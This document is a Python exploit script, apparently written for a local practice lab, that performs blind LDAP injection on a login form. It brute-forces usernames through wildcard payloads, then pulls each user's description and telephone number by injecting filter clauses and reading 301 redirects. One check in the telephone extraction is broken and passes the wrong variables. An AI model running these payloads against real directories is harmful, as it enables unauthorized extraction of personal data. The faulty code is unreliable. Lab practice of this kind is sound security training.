#!/usr/bin/python3

import requests
import time
import sys
import signal
import string
import pdb

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variales globales
main_url = "http://localhost:8888/"
headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

def getUsers():
    characters = string.ascii_lowercase + string.digits
    initial_users = []
    
    old_list = []
    new_list = []
    usernames = []

    for character in characters:
        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False) # Impedimos que haga un follow al redirect para que nos devuelva el código de estado 301
        if r.status_code == 301:
            old_list.append(character)
    
    while len(old_list) > 0:
        for item in old_list:
            for character in characters:
                post_data_guess = "user_id={}{}*&password=*&login=1&submit=Submit".format(item,character)
                r = requests.post(main_url, data=post_data_guess, headers=headers, allow_redirects=False)
                if r.status_code == 301:
                    post_data_complete = "user_id={}{}&password=*&login=1&submit=Submit".format(item,character)
                    r2 = requests.post(main_url, data=post_data_complete, headers=headers, allow_redirects=False)
                    if r2.status_code == 301:
                        usernames.append(item+character)
                    else:
                        new_list.append(item+character)
        old_list.clear()
        old_list=new_list.copy()
        new_list.clear()
    return usernames

def getDescription(username):
    characters = string.printable
    description = ""

    for i in range(0,100):
        for character in characters:
            post_data_guess = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(username, description, character)
            r = requests.post(main_url, data=post_data_guess, headers=headers, allow_redirects=False)
            if r.status_code == 301:
                description += character
                post_data_complete = "user_id={})(description={}))%00&password=*&login=1&submit=Submit".format(username, description)
                r2 = requests.post(main_url, data=post_data_complete, headers=headers, allow_redirects=False)
                if r2.status_code == 301:
                    return description
                else: 
                    break
    return description

def getTelephoneNumber(username):
    characters = string.digits
    telephone = ""
    
    for i in range(0,15):
        for character in characters:
            post_data_guess = "user_id={})(telephoneNumber={}{}*))%00&password=*&login=1&submit=Submit".format(username, telephone, character)
            r = requests.post(main_url, data=post_data_guess, headers=headers, allow_redirects=False)
            if r.status_code == 301:
                telephone += character
                post_data_complete = "user_id={})(telephoneNumber={}))%00&password=*&login=1&submit=Submit".format(telephone, description)
                r2 = requests.post(main_url, data=post_data_complete, headers=headers, allow_redirects=False)
                if r2.status_code == 301:
                    return telephone
                else: 
                    break
    return telephone


if __name__ == '__main__':
   
    p = log.progress("Users Extraction")
    p.status("Getting Users")
    usernames = getUsers()
    p.success(usernames)
    
    print("\n")

    p2 = log.progress("Users Descriptions")
    p2.status("Getting Descriptions")
    for username in usernames:
        description = getDescription(username)
        log.info(("{} : {}").format(username, description))
    p2.success("Done")
    
    print("\n")

    p3 = log.progress("Telephone Numbers")
    p3.status("Extracting telephone data")
    for username in usernames:
        telephone = getTelephoneNumber(username)
        log.info(("{}:{}").format(username, telephone))
    p3.success("Done")
